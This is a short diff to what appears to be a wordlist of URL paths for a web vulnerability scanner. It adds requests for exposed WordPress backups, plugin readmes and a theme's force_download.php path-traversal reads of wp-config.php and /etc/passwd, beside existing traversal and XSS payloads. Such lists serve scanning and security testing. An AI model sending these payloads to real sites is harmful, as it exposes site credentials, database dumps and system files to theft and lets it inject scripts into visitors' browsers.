@@ -2115,3 +2115,17 @@
 /downloader.php?file=../../../../../../../../../../etc/passwd%00.jpg
 /api/icon/getDynamicIcon?type=8&content=%3C%2Ftext%3E%3Ca+href%3D%22java%26%239%3Bscript%3Aalert%28document.domain%29%22%3E%3Ctext+x%3D%2250%25%22+y%3D%2280%25%22+fill%3D%22red%22+style%3D%22font-size%3A60px%22%3EClick+me%3C%2Ftext%3E%3C%2Fa%3E%3Ctext%3E&color=blue
 /ganglia/?tz=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/wp-content/uploads/wp-clone/wpclone_backup/database.sql
+/wp-content/uploads/wp-clone/wpclone_backup/prefix.txt
+/wp-content/plugins/eventon-lite/readme.txt
+/wp-content/uploads/jetbackup/
+/wp-content/uploads/jetbackup/{{folder_name}}/
+/wp-content/plugins/clean-login/readme.txt
+/?p={{postid}}
+/wp-content/themes/the-wound/style.css
+/wp-content/themes/the-wound/force_download.php?file=../../../wp-config.php
+/wp-content/themes/the-wound/force_download.php?file=/etc/passwd
+/.env?raw??
+/wp-content/plugins/fastdup/logs/
+/etc/passwd?raw??
+/etc/passwd
